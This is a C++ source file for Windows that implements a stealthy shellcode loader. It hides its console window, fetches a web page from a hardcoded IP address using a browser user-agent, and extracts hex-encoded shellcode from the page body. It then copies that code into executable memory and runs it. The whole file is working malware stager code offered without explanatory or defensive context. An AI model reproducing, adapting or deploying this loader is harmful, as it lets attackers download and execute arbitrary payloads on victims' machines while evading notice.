#include <windows.h>
#include <winhttp.h>
#include <string>

#pragma comment(lib, "winhttp.lib")
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

int main() {
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);

    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer = NULL;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    std::string payload = "";

    // Download payload
    hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return 0;

    hConnect = WinHttpConnect(hSession, L"192.168.139.138", 80, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return 0;
    }

    hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/meta.html", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 0;
    }

    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    WinHttpReceiveResponse(hRequest, NULL);

    // Read response
    do {
        dwSize = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize) || dwSize == 0) break;
        
        pszOutBuffer = new char[dwSize + 1];
        ZeroMemory(pszOutBuffer, dwSize + 1);
        
        if (WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
            payload.append(pszOutBuffer, dwDownloaded);
        }
        delete[] pszOutBuffer;
    } while (dwSize > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    if (payload.empty()) return 0;

    // Parse shellcode (format: \xfc\xe8...)
    char* memBuffer = (char*)payload.c_str();
    
    // Find shellcode start (first \x pattern after <body>)
    char* start = strstr(memBuffer, "<body>");
    if (start) {
        memBuffer = start + 6; // Skip "<body>"
        // Skip whitespace
        while (*memBuffer == '\n' || *memBuffer == '\r' || *memBuffer == ' ') memBuffer++;
    }
    
    // Find first \x pattern
    while (*memBuffer && !(*memBuffer == '\\' && *(memBuffer + 1) == 'x')) {
        memBuffer++;
    }
    if (!*memBuffer) return 0;

    // Count shellcode bytes
    size_t shellcode_size = 0;
    char* temp = memBuffer;
    while (*temp) {
        if (*temp == '\\' && *(temp + 1) == 'x' && 
            isxdigit(*(temp + 2)) && isxdigit(*(temp + 3))) {
            shellcode_size++;
            temp += 4;
        } else if (*temp == '<') {
            break; // Stop at </body>
        } else {
            temp++;
        }
    }

    if (shellcode_size == 0) return 0;

    // Parse shellcode
    unsigned char* shellcode = new unsigned char[shellcode_size];
    for (size_t i = 0; i < shellcode_size; i++) {
        memBuffer += 2; // Skip "\x"
        if (sscanf_s(memBuffer, "%02hhx", &shellcode[i]) != 1) {
            delete[] shellcode;
            return 0;
        }
        memBuffer += 2; // Skip hex bytes
    }

    // Execute with proper error handling
    void* exec = VirtualAlloc(0, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) {
        delete[] shellcode;
        return 0;
    }
    
    memcpy(exec, shellcode, shellcode_size);
    delete[] shellcode;
    
    // Flush instruction cache
    FlushInstructionCache(GetCurrentProcess(), exec, shellcode_size);
    
    // Execute as function pointer
    ((void(*)())exec)();

    return 0;
}
